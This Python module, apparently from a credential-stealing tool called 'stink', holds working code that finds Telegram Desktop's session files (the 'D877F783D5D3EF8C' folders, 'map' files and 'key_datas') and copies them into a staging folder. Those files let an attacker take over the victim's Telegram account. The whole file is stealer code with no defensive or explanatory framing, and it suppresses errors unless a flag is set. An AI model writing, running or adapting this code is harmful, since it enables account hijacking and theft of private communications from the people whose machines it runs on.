from re import findall
from shutil import copyfile
from os import listdir, path, makedirs

from stink.helpers.config import TelegramConfig


class Telegram:
    """
    Collects sessions from the Telegram.
    """
    def __init__(self, storage_path: str, folder: str, errors: bool):

        self.__storage_path = storage_path
        self.__folder = folder
        self.__errors = errors

        self.__config = TelegramConfig()

    def __create_folder(self) -> None:
        """
        Creates storage for the Telegram module.
        :return: None
        """
        folder = rf"{self.__storage_path}\{self.__folder}\D877F783D5D3EF8C"

        if not path.exists(folder):
            makedirs(folder)

    def __get_sessions(self) -> None:
        """
        Collects sessions from the Telegram.
        :return: None
        """
        if not path.exists(self.__config.SessionsPath):
            return

        folder = rf"{self.__storage_path}\{self.__folder}"
        sessions = sum([findall(r"D877F783D5D3EF8C.*", file) for file in listdir(self.__config.SessionsPath)], [])

        if not sessions:
            return

        self.__create_folder()

        sessions.remove("D877F783D5D3EF8C")

        for session in sessions:
            copyfile(rf"{self.__config.SessionsPath}\{session}", rf"{folder}\{session}")

        maps = sum([findall(r"map.*", file) for file in listdir(rf"{self.__config.SessionsPath}\D877F783D5D3EF8C")], [])

        for map in maps:
            copyfile(rf"{self.__config.SessionsPath}\D877F783D5D3EF8C\{map}", rf"{folder}\D877F783D5D3EF8C\{map}")

        copyfile(rf"{self.__config.SessionsPath}\key_datas", rf"{folder}\key_datas")

    def run(self) -> None:
        """
        Launches the Telegram collection module.
        :return: None
        """
        try:

            self.__get_sessions()

        except Exception as e:
            if self.__errors is True: print(f"[Telegram]: {repr(e)}")
